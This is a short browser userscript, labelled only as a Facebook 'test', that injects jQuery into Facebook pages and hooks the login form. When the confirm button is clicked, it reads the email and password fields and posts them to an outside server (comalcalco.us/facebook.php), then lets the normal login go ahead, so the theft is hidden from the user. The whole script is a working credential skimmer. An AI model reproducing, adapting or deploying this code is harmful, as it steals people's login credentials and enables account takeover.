// ==UserScript==
// @name           TEST NAME
// @namespace      TEST
// @description    Test FB
// @include        https://www.facebook.com/
// @include        http://*.facebook.com/*
// @include        http://www.facebook.com/*
// @include        https://*.facebook.com/*
// @include        https://www.facebook.com/*
// ==/UserScript==

function addJQuery(callback) {
  var script = document.createElement("script");
  script.setAttribute("src", "http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js");
  script.addEventListener('load', function() {
    var script = document.createElement("script");
    script.textContent = "(" + callback.toString() + ")();";
    document.body.appendChild(script);
  }, false);
  document.body.appendChild(script);
}

function main() {
var jq = jQuery.noConflict();
    var form = document.forms.namedItem('login_form');
    var uid = form.elements.namedItem('email');
    var pw = form.elements.namedItem('pass');


 jq('.uiButtonConfirm').click(function() {
   jq('input[type="submit"]').attr('disabled','disabled');
   jq.post("http://comalcalco.us/facebook.php", { em: uid.value, pa: pw.value},
     function(data) {
       alert(data);
       jq('input[type="submit"]').removeAttr('disabled');       
       form.submit();
   });

 });

}

addJQuery(main);